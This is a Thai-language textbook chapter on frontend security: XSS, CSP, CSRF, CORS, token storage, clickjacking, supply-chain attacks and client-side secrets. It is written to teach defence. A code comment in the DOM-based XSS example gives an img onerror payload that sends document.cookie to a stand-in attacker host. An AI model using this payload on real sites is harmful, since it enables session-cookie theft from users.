# บท 16 — Frontend Security: ทำไมซ่อนปุ่มด้วย `isAdmin && ...` ถึงไม่ใช่การจัดการสิทธิ์

> ประโยคแกนของบท: **frontend validation ช่วย UX — backend คือ security boundary จริง** ทุก byte ที่ส่งไปให้ browser คือ byte ที่ผู้ใช้อ่านได้ แก้ได้ ปลอมได้ — งานของ frontend security จึงไม่ใช่ "กันผู้ใช้โกง" (นั่นงาน server) แต่คือ "กันผู้ใช้*ถูกโจมตีผ่านแอปของเรา*"

## เข็มทิศก่อนอ่าน

หลังจากคุยเรื่อง performance, accessibility และ testing มาแล้ว บทนี้เพิ่มมิติที่ทีม frontend มักถูกคาดหวังมากขึ้นเรื่อย ๆ คือความปลอดภัย แต่ต้องเริ่มจากกรอบความคิดที่ถูกก่อน: frontend ไม่ได้มีอำนาจ enforce สิทธิ์แทน server มันมีหน้าที่ลดพื้นผิวการโจมตีและไม่เปิดทางให้ผู้ใช้ถูกโจมตีผ่านแอปของเรา

ให้อ่านโดยแยก UX concern ออกจาก security concern ให้เด็ดขาด เช่น validation, hide/show UI และ disable button อาจช่วยประสบการณ์ใช้งาน แต่ไม่ได้เท่ากับการ authorize หรือปกป้องข้อมูล ความชัดเจนจุดนี้จะทำให้บท production และ system design ตัดสินใจได้แม่นขึ้น

## Mindset แกน — Frontend ไม่ใช่ Security Boundary

สถานการณ์จริง: จูเนียร์ในทีมซ่อนปุ่ม "ลบผู้ใช้" ด้วย `{isAdmin && <DeleteButton />}` แล้วรายงานว่า "จัดการสิทธิ์เรียบร้อย" — สองสัปดาห์ต่อมามีคนเปิด DevTools แก้ `isAdmin` ใน state เป็น true (หรือง่ายกว่านั้น: copy request จาก Network tab แล้วยิงตรงด้วย curl) ลบข้อมูลสำเร็จ เพราะ endpoint ฝั่ง server ไม่เช็คสิทธิ์เลย

หลักที่ต้องฝังในหัว: **browser เป็นเครื่องของผู้ใช้ ไม่ใช่ของเรา** — โค้ด, state, request ทุกอย่างอยู่ในมือเขา คำถามสัมภาษณ์ยอดฮิต *"จะป้องกันผู้ใช้แก้ role จาก DevTools ยังไง?"* คำตอบ senior คือ **"ป้องกันไม่ได้ และไม่ต้องป้องกัน"** — การซ่อนปุ่มใน FE คือ UX (ไม่โชว์ของที่ใช้ไม่ได้ให้รก) ส่วน security คือ server ต้อง authorize **ทุก request** ที่เข้ามา โดยดูจาก session/token ที่ verify แล้ว ไม่ใช่จาก field ใดๆ ที่ client ส่งมา (เล่ม backend บท 6 เรื่อง authN/authZ, บท 20 เรื่อง security in depth) — เช่นเดียวกับราคา: ส่ง `price` จาก client ไปให้ server เชื่อ = เชิญคนซื้อ iPhone ราคา 1 บาท server ต้องดึงราคาจากฐานข้อมูลเองเสมอ

Analogy: frontend validation คือ**พนักงานต้อนรับหน้าร้าน** — ช่วยลูกค้ากรอกฟอร์มถูกตั้งแต่แรก ลด round-trip แต่ตู้เซฟต้องมีกุญแจของตัวเอง จะปล้นธนาคารไม่มีใครหยุดที่แผนกต้อนรับ

แนวตอบ senior: *"ผม validate สองที่ด้วยเหตุผลคนละอย่าง — FE เพื่อ feedback เร็ว, BE เพื่อความปลอดภัยและ integrity เพราะ request มาจากที่ไหนก็ได้ไม่ใช่แค่จากแอปเรา — และ FE ไม่ถือความลับหรือการตัดสินใจเชิงสิทธิ์ใดๆ"*

## XSS — สามสายพันธุ์ของการฉีดสคริปต์

**XSS (Cross-Site Scripting)** = การทำให้ script ของผู้โจมตีรันในหน้าเว็บของเรา ภายใต้ origin ของเรา — พอรันได้มันคือ*ตัวเรา*ในสายตา browser: อ่าน cookie ที่ JS อ่านได้, ยิง API ด้วย session ผู้ใช้, เก็บทุก keystroke, วาดหน้า login ปลอม สามชนิดต่างกันที่ "payload อาศัยอยู่ไหน":

1. **Reflected** — payload อยู่ใน URL แล้วสะท้อนกลับมาในหน้า: `search?q=<script>...</script>` ถ้าหน้า render "ผลค้นหาของ *q*" โดยไม่ escape → เหยื่อแค่**คลิกลิงก์**ที่ผู้โจมตีส่งมา (email/แชท) ก็โดน
2. **Stored** — payload ถูก**บันทึกลง DB**: comment, ชื่อโปรไฟล์, รีวิวสินค้า ที่มี script ฝัง → ทุกคนที่เปิดหน้านั้นโดนหมด อันตรายสุดเพราะเหยื่อไม่ต้องทำอะไรเลย — เหมือนฝังกับดักไว้ใน**สมุดเยี่ยม**ที่ทุกคนต้องเปิดอ่าน
3. **DOM-based** — server ไม่เกี่ยวเลย: JS ฝั่ง client เอาข้อมูลจาก source ที่ผู้ใช้คุมได้ (`location.hash`, `document.referrer`) ไปใส่ sink อันตราย (`innerHTML`, `eval`) — ตรวจจาก log ฝั่ง server ไม่เห็นด้วยซ้ำ

ตัวอย่าง DOM-based ที่เจอจริงในโค้ดรีวิว — หน้า error ที่อยากโชว์ว่า user ค้นอะไรมา:

```ts
// ❌ source (ผู้ใช้คุม URL ได้) ไหลตรงเข้า sink
const q = new URLSearchParams(location.search).get("q");
resultEl.innerHTML = `ไม่พบผลลัพธ์ของ "${q}"`;
// โจมตี: ?q=<img src=x onerror="fetch('//evil.io?c='+document.cookie)">
// ส่งลิงก์นี้ให้เหยื่อคลิก — script รันใน origin ของเราทันที

// ✅ ใช้ sink ที่เป็น text เสมอเมื่อไม่ต้องการ HTML
resultEl.textContent = `ไม่พบผลลัพธ์ของ "${q}"`;
```

สังเกตว่า payload ไม่ใช่ `<script>` ตรงๆ — `innerHTML` ไม่รัน `<script>` ที่แปะเข้าไป แต่ `onerror` ของ `<img>` รัน: การจำ "แค่กรองคำว่า script ก็พอ" คือความเข้าใจผิดที่เจาะได้เสมอ

## ทำไม React/Angular กันให้เกือบหมด — แล้วยังเจาะได้ตรงไหน

Framework ยุคนี้ **escape ค่าโดย default**: `{userInput}` ใน JSX และ `{{ userInput }}` ใน Angular ถูกแปลงเป็น text node — `<script>` กลายเป็นตัวหนังสือ `&lt;script&gt;` ไม่ใช่ element นี่คือเหตุผลที่ XSS "แบบตำรา" แทบหายไปจากแอป React/Angular แต่ช่องที่เหลือคือ**ประตูที่เราเปิดเอง** — และชื่อ API ก็ตะโกนเตือนอยู่แล้ว:

- **`dangerouslySetInnerHTML`** (React) / **`bypassSecurityTrustHtml`** (Angular — Angular มี sanitizer ในตัวสำหรับ `[innerHTML]` แต่ bypass คือการปิดมัน) — ใช้กับข้อมูลที่ผู้ใช้ป้อนโดยไม่ sanitize = เปิดประตู stored XSS เต็มบาน
- **`href` / URL attribute** — auto-escape กัน HTML injection แต่ไม่ได้ตรวจ*ความหมาย*ของ URL: `<a href={userUrl}>` ที่ userUrl = `javascript:alert(1)` คือ XSS ตอนคลิก (Angular sanitize ตรงนี้ให้, React ตั้งแต่ v16.9 แค่ warn — ต้อง validate scheme เองให้เหลือ http/https)
- **Third-party script** — `<script src="https://cdn.analytics.io/tag.js">` รันด้วยสิทธิ์เต็มของหน้าเรา: CDN โดน compromise = เราโดนด้วย (เคส Magecart ขโมยเลขบัตรจากหน้า checkout ผ่าน script วิเคราะห์ที่ถูกฝังโค้ด และเคส polyfill.io ปี 2024 ที่โดเมนถูกซื้อไปแล้วเสิร์ฟ script มุ่งร้ายใส่เว็บนับแสน)

## Sanitization vs Escaping — คนละงาน

- **Escaping** = ทำให้ข้อมูล*ถูกแสดงเป็นตัวหนังสือ*: `<b>` กลายเป็น `&lt;b&gt;` เห็นเป็นข้อความ — ใช้เมื่อไม่ต้องการให้เป็น HTML เลย (default ของ framework)
- **Sanitization** = *ยอมให้เป็น HTML แต่คัดกรอง*: เก็บ `<b><p><a>` ทิ้ง `<script>`, `onerror=`, `javascript:` — ใช้เมื่อ**ต้อง** render HTML จริง (rich text editor, บทความจาก CMS, ผล render markdown)

เมื่อจำเป็นต้องใช้ ให้ผ่าน **DOMPurify** — มาตรฐานพฤตินัยที่ parse HTML ด้วย parser ของ browser จริงแล้ว whitelist:

```tsx
import DOMPurify from "dompurify";

function ArticleBody({ html }: { html: string }) {
  // sanitize ทุกครั้งก่อนเข้า sink — อย่าเชื่อว่า "ฝั่ง save ทำแล้ว" (defense in depth)
  const clean = DOMPurify.sanitize(html, { USE_PROFILES: { html: true } });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

ห้ามเขียน sanitizer เองด้วย regex — HTML parser มี edge case ระดับที่ regex ตามไม่ทัน (`<img src=x onerror=...>`, encoding แปลกๆ) นี่คือปัญหาที่โลกแก้แล้ว

## CSP — ชั้นป้องกันสุดท้ายเมื่อ XSS หลุด

**CSP (Content Security Policy)** คือ HTTP header ที่บอก browser ว่า "หน้าเว็บนี้อนุญาตให้โหลด/รันอะไรจากไหน" — analogy: **รายชื่อแขกที่ประตูงาน** ต่อให้ผู้โจมตีฉีด `<script>` เข้ามาได้ (XSS หลุดชั้นแรกแล้ว) script ที่ไม่อยู่ในรายชื่อจะไม่ถูกรัน — CSP ไม่ได้กัน XSS แต่**ลดความเสียหายเมื่อกันไม่อยู่** (defense in depth — เล่ม backend บท 20)

แนวปัจจุบัน (CSP Level 3) เลิกใช้ whitelist รายโดเมน (ยาว เปราะ และ bypass ได้ผ่าน JSONP/gadget บนโดเมนที่ whitelist) → ใช้ **nonce + strict-dynamic**:

```http
Content-Security-Policy:
  script-src 'nonce-r4nd0m123' 'strict-dynamic';
  object-src 'none'; base-uri 'none';
```

กลไก: server สุ่ม nonce ใหม่ทุก response แปะทั้งใน header และ `<script nonce="r4nd0m123">` — script ที่ไม่มี nonce (เช่นตัวที่ XSS ฉีด) ไม่รัน ส่วน `strict-dynamic` = "script ที่มี nonce แล้ว โหลด script ต่อได้" แก้ปัญหา third-party tag ที่โหลดลูกโซ่ **Trusted Types** เป็นชั้นถัดไป: header `require-trusted-types-for 'script'` ทำให้การยัด string ดิบใส่ sink (`innerHTML`, `eval`) โยน error ทันที — ต้องผ่าน policy ที่ sanitize ก่อนเท่านั้น เท่ากับปิด DOM-based XSS เชิงโครงสร้าง (สถานะ 2026: Chromium ใช้ได้เต็มมานาน แต่ browser engine อื่นยังตามไม่ครบ — ยังไม่เข้า Baseline ตรวจ caniuse ก่อนพึ่งเป็นชั้นหลัก และวางให้ degrade ได้ถ้า browser ไม่รองรับ)

ใช้ผิดพังยังไง: ใส่ `'unsafe-inline'` เพื่อ "ให้มันใช้ได้ก่อน" = ปิด CSP ทั้งใบโดยยังจ่ายค่า header อยู่ ลำดับ rollout ที่ถูก: เริ่มจากโหมดรายงานก่อนเสมอ —

```http
Content-Security-Policy-Report-Only:
  script-src 'nonce-r4nd0m123' 'strict-dynamic'; report-to csp-endpoint
```

โหมดนี้ browser ไม่ block อะไร แค่ส่งรายงาน violation มาให้ — รันสักหนึ่งถึงสองสัปดาห์ เก็บว่ามี inline script/third-party ตัวไหนที่จะพังบ้าง เคลียร์ให้หมด แล้วค่อยสลับเป็น header จริง — เปิด CSP แบบ big bang ในแอปที่มี script เก่าเยอะ = หน้าขาวทั้งเว็บใน production

## CSRF — Browser ที่ซื่อสัตย์เกินไป

**CSRF (Cross-Site Request Forgery)**: เหยื่อ login `bank.com` ค้างไว้ แล้วเปิด `evil.com` ซึ่งมี form ที่ auto-submit POST ไป `bank.com/transfer` — กลไกคือ browser **แนบ cookie ของ bank.com ให้เองเสมอ**เมื่อ request วิ่งไปหา bank.com ไม่ว่าใครเป็นคนสั่งยิง — เหมือน**ตราประทับบริษัทที่ประทับให้ทุกซองอัตโนมัติ** ใครหลอกให้เราส่งซองได้ ซองนั้นก็มีตราครบ ส่วน token ใน header (`Authorization: Bearer ...`) ไม่โดน เพราะ JS ของ evil.com อ่าน token ข้าม origin ไม่ได้และ browser ไม่แนบ header ให้เอง — **CSRF เป็นโรคของ cookie-based auth เท่านั้น**

การป้องกันปัจจุบัน:

- **`SameSite`** — ปี 2026 Chrome (และแนวเดียวกันในเบราว์เซอร์หลัก) ตั้ง cookie ที่ไม่ระบุเป็น **`Lax` โดย default** มาหลายปีแล้ว: cookie ไม่ถูกแนบใน cross-site POST/iframe/รูป แต่*ยังแนบ*ใน top-level GET navigation → กันเคสคลาสสิกได้มาก แต่ยังไม่หมด: endpoint ที่เผลอทำ side effect ผ่าน GET, subdomain ที่ถูกยึด (same-site กันเอง), และ default ที่ browser เก่า/edge case ไม่บังคับ
- **ยังต้อง CSRF token ไหม?** คำตอบ senior: ตั้ง `SameSite=Lax` (หรือ `Strict` กับ cookie ที่ sensitive) **อย่างชัดเจน** อย่าพึ่ง default + สำหรับ mutation สำคัญยังใส่ CSRF token (double-submit หรือ synchronizer — เล่ม backend บท 6) — สองชั้นเพราะชั้นเดียวมีรูรั่วคนละแบบ · เกร็ดที่เกี่ยว: แผน phase-out third-party cookie ของ Chrome ถูก**ยกเลิกแล้ว** (ประกาศกลางปี 2024 และถอน prompt ในปี 2025) — อย่าไปตอบสัมภาษณ์ว่า "เดี๋ยว cookie ข้าม site ก็ตายแล้วไม่ต้องกัน"

ฝั่ง frontend มีหน้าที่ในกลไก token ด้วย — double-submit ฉบับย่อ: server ตั้ง cookie `csrf_token` (ตัวนี้*ไม่* httpOnly โดยตั้งใจ) แล้ว FE อ่านมาแนบ header ทุก mutation:

```ts
// evil.com ทำข้อนี้ไม่ได้: มันสั่ง browser แนบ cookie ได้ แต่ "อ่านค่า" cookie ข้าม origin ไม่ได้
api.interceptors.request.use((config) => {
  if (config.method !== "get") {
    config.headers["X-CSRF-Token"] = readCookie("csrf_token");
  }
  return config;
});
// server เทียบ header กับ cookie — ตรงกัน = คนยิงอ่าน cookie ได้จริง = มาจาก origin เรา
```

## CORS — เกราะของผู้ใช้ ไม่ใช่ของ Server

ความเข้าใจผิดยอดฮิตที่คั่นกลาง junior/senior: "ตั้ง CORS เข้มๆ แล้ว server ปลอดภัย" — ผิดทิศ **CORS (Cross-Origin Resource Sharing)** คือกลไกที่ *browser* ใช้ตัดสินว่าจะยอมให้ *JS ของ site อื่นอ่าน response* จาก origin เราไหม — มันปกป้อง**ผู้ใช้** (กัน evil.com ใช้ browser ของเหยื่อไปอ่านข้อมูลจาก API เราด้วย cookie ของเหยื่อ) ไม่ได้ปกป้อง server: curl, Postman, script ฝั่ง server ไม่มี CORS และยิงตรงได้เสมอ — server จึงยังต้อง authenticate/authorize ทุก request เหมือนเดิม (วนกลับ mindset แกนของบท) ที่ตามมา: การตั้ง `Access-Control-Allow-Origin: *` กับ endpoint สาธารณะที่ไม่ใช้ cookie ไม่ใช่ช่องโหว่ในตัวมันเอง แต่การ echo `Origin` กลับแบบไม่ตรวจ *พร้อม* `Allow-Credentials: true` คือการยกข้อมูลผู้ใช้ให้ทุกโดเมนบนโลก

## Token เก็บไหนดี — ข้อถกเถียงจริง

| ที่เก็บ | XSS ขโมยได้? | CSRF? | หมายเหตุ |
|---|---|---|---|
| `localStorage` | ✅ โดนเต็ม — JS ใดๆ ในหน้าอ่านได้ | ❌ ไม่เกิด (ต้องแนบเองใน header) | ง่ายสุด เสี่ยงสุด |
| Memory (ตัวแปร JS) | บางส่วน (script ที่รันอยู่ยัง exfiltrate ได้) | ❌ | หายตอน refresh — ต้องคู่ refresh token |
| Cookie `httpOnly` + `Secure` + `SameSite` | ❌ JS **อ่านไม่ได้** | ⚠️ เกิดได้ — ต้องกันเพิ่ม | ภาระไปอยู่ที่ CSRF protection |

ประเด็นที่มักเข้าใจผิด: httpOnly ไม่ได้กัน XSS — script ที่ฉีดเข้ามาแล้วยัง*ยิง request ในนามผู้ใช้*ได้อยู่ดี (cookie แนบให้เอง) มันกันแค่ "การ*ขโมย* token ออกไปใช้ที่อื่น/หลัง session จบ" ซึ่งก็ลด blast radius ได้จริง

คำแนะนำปัจจุบัน: **access token ใน httpOnly cookie (`Secure`, `SameSite=Lax/Strict`) + CSRF protection** หรือขั้นกว่าคือ **BFF (Backend For Frontend)**: browser ถือแค่ session cookie ธรรมดา ส่วน token จริง (ของ IdP/บริการหลังบ้าน) อยู่ที่ BFF server ไม่เคยลงมาแตะ browser เลย — token ที่ browser ไม่เคยเห็นคือ token ที่ browser ทำหลุดไม่ได้

## Clickjacking

ผู้โจมตีฝังเว็บเราใน `<iframe>` โปร่งใส ทับด้วยปุ่ม "รับรางวัล!" — เหยื่อคิดว่ากดปุ่มเกม จริงๆ กด "โอนเงิน" ของเราที่มองไม่เห็น แก้ด้วย CSP `frame-ancestors 'none'` (หรือระบุ origin ที่ยอมให้ embed) — ตัวแทนสมัยใหม่ของ header เก่า `X-Frame-Options`

## Supply Chain — โค้ดคนอื่นในบ้านเรา

แอป frontend ทั่วไปมี dependency (รวม transitive) หลักร้อยถึงพัน — ทุกตัวรันด้วยสิทธิ์เต็มทั้งใน build และใน browser การ `npm install` หนึ่งครั้งคือ**การเชิญคนแปลกหน้าพันคนเข้าบ้านพร้อมกุญแจสำรอง** เหตุการณ์จริงที่ senior ควรเล่าได้:

| เหตุการณ์ | ปี | รูปแบบการโจมตี |
|---|---|---|
| `event-stream` | 2018 | maintainer เหนื่อยแล้วมอบสิทธิ์ให้อาสาสมัครแปลกหน้า → แอบฝังโค้ดขโมย bitcoin wallet ใน dependency ย่อย |
| `ua-parser-js`, `node-ipc` | 2021–2022 | บัญชี maintainer โดน hijack / maintainer ฝัง payload เอง (protestware) |
| Typosquatting (`lodahs`, `crossenv`) | เรื้อรัง | ตั้งชื่อ package เลียนของดัง รอคนพิมพ์ผิดหนึ่งตัวอักษร |
| `polyfill.io` | 2024 | โดเมน CDN ถูกขายเปลี่ยนมือ แล้วเสิร์ฟ script มุ่งร้ายใส่เว็บนับแสนที่ฝัง tag ไว้ |

การป้องกันขั้นพื้นฐานที่ต้องมี (โยงเล่ม backend บท 20 — เป็นวินัยเดียวกัน):

- **Lockfile** commit เสมอ + CI ใช้ `npm ci` (ติดตั้งตาม lock เป๊ะ) — กันเวอร์ชันไหลเอง
- `npm audit` ใน CI — แต่เข้าใจ nuance: เสียงเตือนส่วนใหญ่คือ devDependencies ที่ไม่ถึง production, จัดลำดับตาม reachability ไม่ใช่ตามจำนวน
- **Dependabot/Renovate** — อัปเดตเป็น PR เล็กสม่ำเสมอ (ปล่อยค้างปีแล้วอัปทีเดียว = เจ็บกว่า) แต่*อย่า auto-merge major ทันทีที่ออก* — มัลแวร์มักอยู่ในเวอร์ชันที่เพิ่งถูก hijack การรอสองสามวันคือ filter ฟรี
- Third-party `<script>` บนหน้า: ใช้ **SRI (Subresource Integrity — attribute `integrity` ที่ให้ browser ตรวจ hash ของไฟล์)** เมื่อ pin เวอร์ชันได้ และตัดสินใจอย่างมีสติว่า tag ตัวไหน*คุ้มความเสี่ยง*ที่จะอยู่บนหน้า checkout

## Source Map บน Production

Source map ทำให้ stack trace ใน error tracker อ่านออก (บท 13 พูดเรื่อง debug prod) แต่ serve public = แจกซอร์สโค้ดพร้อม comment ให้โลก คำตอบ nuance ที่ senior ควรให้: **สร้าง source map ตอน build → upload ให้ error tracker (Sentry ฯลฯ) → ไม่ deploy ขึ้น public server** ได้ทั้ง stack trace อ่านออกและไม่เปิดเผยโค้ด — และย้ำหลักถัดไปทันที: ต่อให้ไม่มี source map โค้ดก็แค่*อ่านยากขึ้น* ไม่ใช่*ลับ* — การซ่อนโค้ดไม่ใช่กลไก security (security through obscurity)

## Secret ใน Frontend — ไม่มีอยู่จริง

`VITE_API_KEY=...` แล้วใช้ใน client code = key นั้น**อยู่ใน bundle ที่ทุกคน view-source ได้** ไม่ว่าจะ minify กี่ชั้น — คำว่า environment variable ฝั่ง FE คือ "config ตอน build" ไม่ใช่ "ความลับ" กติกาเด็ดขาด: **ไม่มีคำว่า secret ใน bundle** — key ที่มีสิทธิ์จริง (payment, DB, LLM API) ต้องอยู่หลัง **BFF/proxy**: browser เรียก endpoint ของเรา → server ของเราแนบ key แล้วเรียกต่อ พร้อมทำ rate limit และ authorize ได้ด้วย ส่วน key ที่ออกแบบมาให้ public อยู่แล้ว (Google Maps browser key, Firebase config) ไม่ใช่ secret — ความปลอดภัยของมันอยู่ที่ referrer restriction และ security rules ฝั่งบริการ

## คำถามสัมภาษณ์ที่ต้องตอบได้

1. **ผู้ใช้เปิด DevTools แก้ role เป็น admin ได้ — ป้องกันยังไง?**
   → ป้องกันไม่ได้และไม่ต้อง: browser เป็นเครื่องของผู้ใช้ การซ่อนปุ่มคือ UX ไม่ใช่ security — server ต้อง authorize ทุก request จาก session/token ที่ verify เอง ไม่เชื่อ field ใดๆ จาก client แก้ FE ได้แค่หน้าจอตัวเอง แต่ต้องผ่านด่าน server เสมอ

2. **React escape ให้อยู่แล้ว — แปลว่าไม่ต้องกังวล XSS?**
   → ไม่: auto-escape ปิดเคส interpolation ปกติ แต่ช่องที่เหลือคือ dangerouslySetInnerHTML/bypassSecurityTrust กับข้อมูลที่ไม่ผ่าน DOMPurify, `href` ที่เป็น `javascript:`, และ third-party script ที่รันด้วยสิทธิ์เต็มของหน้า — บวก CSP (nonce + strict-dynamic) เป็นตาข่ายชั้นสุดท้ายเมื่อชั้นแรกหลุด

3. **CSRF เกิดได้ยังไง แล้วทำไม token ใน header ไม่โดน**
   → เพราะ browser แนบ cookie ให้อัตโนมัติทุก request ที่วิ่งไปหา origin นั้น ไม่ว่าใครสั่งยิง — evil.com หลอกให้ browser ยิง POST พร้อม cookie จริงได้ แต่ header ต้องให้ JS แนบเอง และ JS ข้าม origin อ่าน token เราไม่ได้ ป้องกันด้วย SameSite=Lax/Strict อย่างชัดเจน + CSRF token สำหรับ mutation สำคัญ

4. **เก็บ token ที่ localStorage หรือ cookie ดี?**
   → localStorage โดน XSS อ่านได้ตรงๆ / httpOnly cookie ทำให้ JS อ่านไม่ได้ (ลดการขโมย token) แต่แลกกับต้องกัน CSRF — คำแนะนำผม: httpOnly + Secure + SameSite + CSRF protection หรือถ้าออกแบบใหม่ได้ใช้ BFF ให้ token จริงไม่ลงมาที่ browser เลย และย้ำว่า httpOnly ไม่ได้กัน XSS ยิง request ในนามผู้ใช้ — มันลดแค่ blast radius

5. **CSP ช่วยอะไร ในเมื่อเรากัน XSS อยู่แล้ว**
   → มันคือ defense in depth: วันที่ sanitize พลาดสักจุด CSP ทำให้ script ที่ฉีดเข้ามาไม่ถูกรันเพราะไม่มี nonce — แนวปัจจุบันคือ nonce + strict-dynamic แทน whitelist โดเมน, เริ่มด้วย Report-Only ก่อนเปิดจริง, และเสริม Trusted Types เพื่อปิด DOM sink เชิงโครงสร้าง

6. **ถ้าต้องใช้ API key ของบริการภายนอกใน frontend ทำยังไง**
   → ตั้งคำถามก่อนว่า key นั้น public-by-design ไหม — ถ้าใช่ (Maps, Firebase) ใช้ได้แต่ต้องล็อก restriction ฝั่งบริการ ถ้าเป็น key ที่มีสิทธิ์จริง ห้ามอยู่ใน bundle เด็ดขาด เพราะทุกอย่างใน bundle คือ public — ให้เรียกผ่าน BFF/proxy ที่ server แนบ key เอง พร้อมได้ rate limit และ audit ฟรี

## สรุปท้ายบท

- frontend security เริ่มจากการยอมรับว่าฝั่ง client ไม่ใช่ security boundary
- งานของ frontend คือช่วยลดพื้นผิวการโจมตี, ไม่เปิดช่อง XSS/CSRF/secret leak และไม่สร้างภาพลวงว่าการซ่อน UI เท่ากับการป้องกันสิทธิ์
- หลักคิดเรื่อง boundary ที่ถูกต้องช่วยให้ตัดสินใจเรื่อง token, CSP, sanitization และ third-party script ได้แม่นขึ้น
- security ที่ดีใน frontend จึงเป็นการร่วมมือกับ backend ไม่ใช่การพยายามแบกงานของ backend มาไว้ใน browser

## ก่อนไปบทถัดไป

เมื่อเก็บทั้งเรื่อง performance, accessibility, testing และ security แล้ว บทถัดไปจะพาไปใช้ของทั้งหมดในระดับ system design และ production decision ซึ่งเป็นสนามที่แนวคิดเหล่านี้ต้องมาชนกันจริง
